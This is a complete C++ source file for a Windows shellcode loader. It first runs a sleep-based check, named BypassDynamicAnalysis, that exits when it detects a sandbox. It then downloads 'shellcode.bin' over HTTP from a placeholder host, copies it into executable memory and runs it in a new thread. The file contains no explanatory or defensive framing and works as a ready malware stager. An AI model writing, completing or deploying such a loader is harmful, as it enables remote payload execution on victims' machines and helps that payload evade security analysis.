#include <Windows.h>
#include <Winhttp.h>
#include <iostream>
#include <vector>
#include <conio.h>
#include <memory>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "ntdll.lib")

class WinHttpHandle {
public:
	WinHttpHandle(HINTERNET handle = NULL) : handle_(handle) {}
	~WinHttpHandle() { if (handle_) WinHttpCloseHandle(handle_); }
	
	WinHttpHandle(const WinHttpHandle&) = delete;
	WinHttpHandle& operator=(const WinHttpHandle&) = delete;
	
	WinHttpHandle(WinHttpHandle&& other) noexcept : handle_(other.handle_) {
		other.handle_ = NULL;
	}
	
	WinHttpHandle& operator=(WinHttpHandle&& other) noexcept {
		if (this != &other) {
			if (handle_) WinHttpCloseHandle(handle_);
			handle_ = other.handle_;
			other.handle_ = NULL;
		}
		return *this;
	}
	
	HINTERNET get() const { return handle_; }
	void reset(HINTERNET handle = NULL) {
		if (handle_) WinHttpCloseHandle(handle_);
		handle_ = handle;
	}
	
	operator bool() const { return handle_ != NULL; }
	
private:
	HINTERNET handle_;
};

void BypassDynamicAnalysis() {
	ULONGLONG tick = GetTickCount64();
	Sleep(5000);
	ULONGLONG tock = GetTickCount64();
	if ((tock - tick) < 4500) {
		exit(0);
	}
}

std::vector<BYTE> Download(LPCWSTR baseAddress, int port, LPCWSTR filename) {
	WinHttpHandle hSession(WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0));
	if (!hSession) {
		std::printf("WinHttpOpen Error: %d\n", GetLastError());
		return std::vector<BYTE>();
	}

	WinHttpHandle hConnect(WinHttpConnect(hSession.get(), baseAddress, port, 0));
	if (!hConnect) {
		std::printf("WinHttpConnect Error: %d\n", GetLastError());
		return std::vector<BYTE>();
	}

	WinHttpHandle hRequest(WinHttpOpenRequest(hConnect.get(), L"GET", filename, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0));
	if (!hRequest) {
		std::printf("WinHttpOpenRequest Error: %d\n", GetLastError());
		return std::vector<BYTE>();
	}

	if (!WinHttpSendRequest(hRequest.get(), WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
		std::printf("WinHttpSendRequest Error: %d\n", GetLastError());
		return std::vector<BYTE>();
	}

	if (!WinHttpReceiveResponse(hRequest.get(), NULL)) {
		std::printf("WinHttpReceiveResponse Error: %d\n", GetLastError());
		return std::vector<BYTE>();
	}

	std::vector<BYTE> buffer;
	DWORD bytesRead = 0;
	do {
		BYTE temp[4096];
		ZeroMemory(temp, sizeof(temp));
		WinHttpReadData(hRequest.get(), temp, sizeof(temp), &bytesRead);

		if (bytesRead > 0) {
			buffer.insert(buffer.end(), temp, temp + bytesRead);
		}
	} while (bytesRead > 0);

	return buffer;
}

wchar_t* CharArrayToLPCWSTR(const char* array) {
	wchar_t* wString = new wchar_t[4096];
	MultiByteToWideChar(CP_ACP, 0, array, -1, wString, 4096);
	return wString;
}

int main(void) {
	BypassDynamicAnalysis();
	std::vector<BYTE> recvbuf;

	recvbuf = Download(L"0.0.0.0", 8000, L"shellcode.bin");
	if (recvbuf.empty()) {
		printf("Download failed.\n");
		return 1;
	}

	LPVOID alloc_mem = VirtualAlloc(NULL, recvbuf.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!alloc_mem) {
		printf("VirtualAlloc failed: %u\n", GetLastError());
		return 1;
	}

	CopyMemory(alloc_mem, recvbuf.data(), recvbuf.size());

	DWORD oldProtect;
	if(!VirtualProtect(alloc_mem, recvbuf.size(), PAGE_EXECUTE_READ, &oldProtect)) {
		printf("VirtualProtect failed: %u\n", GetLastError());
		VirtualFree(alloc_mem, 0, MEM_RELEASE);
		return 1;
	}

	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if(!hThread) {
		printf("CreateThread failed: %u\n", GetLastError());
		VirtualFree(alloc_mem, 0, MEM_RELEASE);
		return 1;
	}

	printf("alloc_mem address : %p\n", alloc_mem);
	WaitForSingleObject(hThread, INFINITE);
	((void(*)(void))alloc_mem)();
	
	VirtualFree(alloc_mem, 0, MEM_RELEASE);
	return 0;
}